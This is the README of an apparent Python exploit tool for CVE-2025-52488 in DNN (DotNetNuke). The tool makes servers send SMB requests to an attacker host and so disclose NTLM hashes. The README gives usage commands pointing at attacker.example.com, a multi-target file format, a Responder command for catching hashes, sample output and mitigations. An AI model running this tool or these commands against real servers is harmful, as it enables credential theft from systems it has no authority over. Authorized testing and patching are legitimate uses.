# DNN Unicode Path Normalization NTLM Hash Disclosure Exploit (CVE-2025-52488)

## Overview
This exploit targets a vulnerability in DNN (formerly DotNetNuke) versions 6.0.0 to before 10.0.1 that allows attackers to disclose NTLM hashes through Unicode path normalization attacks.

## Vulnerability Details
- **CVE ID**: CVE-2025-52488
- **Severity**: High (CVSS 8.6)
- **Affected Versions**: 6.0.0 to before 10.0.1
- **Attack Vector**: Network
- **Authentication**: Not required

## How it Works
The exploit abuses Windows/.NET quirks and Unicode normalization to force the target DNN server to make SMB requests to an attacker-controlled server, potentially exposing NTLM hashes during the authentication process.

## Prerequisites
1. Python 3.7+
2. Required packages (install with `pip install -r requirements.txt`)
3. SMB server to capture NTLM hashes (e.g., Responder, Burp Collaborator)

## Usage

### Basic Usage
```bash
python main.py targets.txt attacker.example.com
```

### With Custom Parameters
```bash
python main.py targets.txt 192.168.1.100 -t 20 --timeout 15
```

### Arguments
- `targets`: File containing list of DNN hosts (one per line)
- `smb_server`: SMB server hostname/IP to capture NTLM hashes
- `-t, --threads`: Number of concurrent threads (default: 10)
- `--timeout`: Request timeout in seconds (default: 10)

## Target File Format
Create a text file with target URLs, one per line:
```
http://target1.example.com
https://target2.example.com:8080
target3.example.com
```

## Setting Up SMB Server
You can use tools like Responder to capture NTLM hashes:
```bash
responder -I eth0 -wrf
```

Or use Burp Collaborator for out-of-band detection.

## Example Output
```
[2025-01-XX-XX:XX:XX] [INFO] Starting DNN NTLM hash disclosure exploit against 5 targets
[2025-01-XX-XX:XX:XX] [INFO] SMB Server: attacker.example.com
[2025-01-XX-XX:XX:XX] [SUCCESS] [target1.com] DNN indicator found: dnn_IsMobile
[2025-01-XX-XX:XX:XX] [SUCCESS] [target1.com] File upload endpoint accessible
[2025-01-XX-XX:XX:XX] [SUCCESS] [target1.com] Exploit payload sent successfully
[2025-01-XX-XX:XX:XX] [INFO] [target1.com] Check your SMB server for incoming NTLM authentication attempts
```

## Detection Indicators
The exploit looks for the following DNN indicators:
- `dnn_IsMobile` cookie
- `dotnetnuke` in response
- `dnnconnect` in response
- `DNN Platform` in response

## Mitigation
- Update DNN to version 10.0.1 or later
- Implement network-level controls to prevent SMB requests to external servers
- Monitor for suspicious file upload attempts

## Disclaimer
This tool is for educational and authorized security testing purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## References
- [CVE-2025-52488](https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-mgfv-2362-jq96)
- [Assetnote Research](https://slcyber.io/assetnote-security-research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/#hunting-variants)